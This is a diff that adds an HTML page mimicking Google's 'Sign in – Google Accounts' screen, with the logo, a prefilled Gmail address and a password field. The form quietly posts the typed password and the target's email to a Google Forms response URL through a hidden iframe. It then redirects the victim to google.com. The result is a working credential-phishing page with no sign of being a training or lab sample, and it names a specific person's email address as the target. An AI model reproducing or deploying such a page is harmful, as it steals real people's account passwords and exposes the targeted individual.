@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Sign in – Google Accounts</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Google+Sans&display=swap">
+  <style>
+    body {
+      background-color: #202124;
+      font-family: 'Google Sans', Roboto, Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      color: #e8eaed;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .main-container {
+      max-width: 450px;
+      background-color: #292a2d;
+      border-radius: 8px;
+      padding: 48px 40px 36px;
+      margin-top: 50px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.4);
+    }
+
+    .logo {
+      display: block;
+      margin: 0 auto 20px;
+      width: 75px;
+    }
+
+    h1 {
+      font-weight: 400;
+      font-size: 24px;
+      margin-bottom: 16px;
+    }
+
+    .email-display {
+      background-color: #3c4043;
+      padding: 10px 14px;
+      border-radius: 20px;
+      display: inline-flex;
+      align-items: center;
+      font-size: 14px;
+      margin-bottom: 30px;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+    }
+
+    label {
+      font-size: 14px;
+      margin-bottom: 6px;
+    }
+
+    input[type="password"], input[type="text"] {
+      background-color: #202124;
+      border: 1px solid #5f6368;
+      border-radius: 4px;
+      padding: 12px;
+      color: #e8eaed;
+      font-size: 16px;
+      margin-bottom: 16px;
+    }
+
+    .show-password {
+      font-size: 14px;
+      margin-bottom: 24px;
+      display: flex;
+      align-items: center;
+      color: #9aa0a6;
+    }
+
+    .show-password label {
+      margin-left: 6px;
+    }
+
+    .forgot-link {
+      font-size: 14px;
+      color: #8ab4f8;
+      text-decoration: none;
+      margin-bottom: 30px;
+    }
+
+    .submit-btn {
+      align-self: flex-end;
+      background-color: #8ab4f8;
+      color: #202124;
+      padding: 10px 24px;
+      border: none;
+      border-radius: 20px;
+      font-weight: 500;
+      cursor: pointer;
+      font-size: 14px;
+    }
+
+    .submit-btn:hover {
+      background-color: #a6c8ff;
+    }
+
+    .footer {
+      text-align: center;
+      margin-top: 30px;
+      font-size: 13px;
+      color: #9aa0a6;
+    }
+
+    .footer a {
+      color: #9aa0a6;
+      text-decoration: none;
+      margin: 0 10px;
+    }
+
+    @media (max-width: 500px) {
+      .main-container {
+        margin: 20px;
+        padding: 30px 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="main-container">
+    <!-- Transparent logo -->
+    <svg xmlns="https://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48" aria-hidden="true" jsname="jjf7Ff"><path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path><path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path><path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path><path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path></svg>
+    
+    <h1>Welcome</h1>
+
+    <!-- Email display only -->
+    <div class="email-display">
+      bitanyasolomon84@gmail.com
+    </div>
+
+    <!-- Form submission to Google Form -->
+    <form id="loginForm"
+      action="https://docs.google.com/forms/d/e/1FAIpQLSes7Z0mDFC_lTzWwiS_BwRN-cXFiXBpLlmhpiBQ0ZLyELtWJg/formResponse"
+      method="POST"
+      target="hidden_iframe"
+      onsubmit="submitted=true;">
+
+      <!-- Hidden email field (maps to entry.1248511260) -->
+      <input type="hidden" name="entry.1248511260" value="bitanyasolomon84@gmail.com" />
+
+      <!-- Password input field (shown as Password, sent as access key) -->
+      <label for="password">Password</label>
+      <input type="password" id="password" name="entry.1735682508" required />
+
+      <div class="show-password">
+        <input type="checkbox" id="togglePassword">
+        <label for="togglePassword">Show password</label>
+      </div>
+
+      <a href="#" class="forgot-link">Forgot password?</a>
+
+      <button type="submit" class="submit-btn">Next</button>
+    </form>
+  </div>
+
+  <div class="footer">
+    <div>English (United States)</div>
+    <div>
+      <a href="#">Help</a>
+      <a href="#">Privacy</a>
+      <a href="#">Terms</a>
+    </div>
+  </div>
+
+  <script>
+    // Show/hide password logic
+    document.getElementById('togglePassword').addEventListener('change', function () {
+      const pwd = document.getElementById('password');
+      pwd.type = this.checked ? 'text' : 'password';
+    });
+  </script>
+  <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;" onload="redirectAfterSubmit()"></iframe>
+<script>
+  var submitted = false;
+
+  function redirectAfterSubmit() {
+    if (submitted) {
+      window.location.href = "https://www.google.com";
+    }
+  }
+
+  // Toggle password visibility
+  document.getElementById('togglePassword').addEventListener('change', function () {
+    const pwd = document.getElementById('password');
+    pwd.type = this.checked ? 'text' : 'password';
+  });
+</script>
+
+</body>
+</html>
